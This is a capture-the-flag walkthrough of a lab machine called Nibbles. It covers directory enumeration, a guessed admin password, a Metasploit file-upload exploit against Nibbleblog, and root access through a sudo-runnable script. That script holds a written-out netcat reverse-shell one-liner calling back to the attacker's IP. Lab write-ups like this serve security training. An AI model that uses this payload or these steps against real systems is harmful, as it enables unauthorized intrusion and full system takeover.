Nibbles

Target IP: 10.129.96.84

Scanning


There are only two TCP ports open on the target machine: SSH and HTTP on their standard ports.

Enumeration

Port 80: HTTP

This application displays the webpage above. Reading through the source-code I find the HTML comment <!-- /nibbleblog/ directory. Nothing interesting here! --> hint.


Browsing to /nibbleblog/ displays the webpage above.


Running the command gobuster dir -u http://10.129.96.84/nibbleblog/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt shows the interesting result as shown above about the target.



The update.php contains more information about the CMS used by the target host, including the version of the application. This application is vulnerable, but I need the username and password to exploit it.


During enumeration, I found an interesting directory with the location http://10.129.96.84/nibbleblog/content/private/users.xml that contains the admin username.

Exploitation


Trying default credentials did not work against this machine. However, trying the password nibbles with the username admin worked! Now I have access to the CMS. Now I have the login details, I can use the verified exploit against the target machine. The exploit I will use is multi/http/nibbleblog_file_upload using Metasploit.


Initialising the parameters of the exploit.


And now I have a foothold on the machine as the user nibbler.

Privilege Escalation


There exists a script called monitor.sh that can be executed as root. I will need to create that script as it does not exist at the moment.



I created the directory /personal/stuff/ and put the script monitor.sh inside this directory. I used echo to put the following payload rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.19 8444 >/tmp/f' inside the script. When making this script, I made it executable. Then I ran it with sudo, and gained a reverse shell connection on port 8444.

Flags


The user.txt flag once I gained a foothold on the machine.


The root.txt flag once I created the monitor.sh script file with a reverse shell script inside it to gain a root shell.
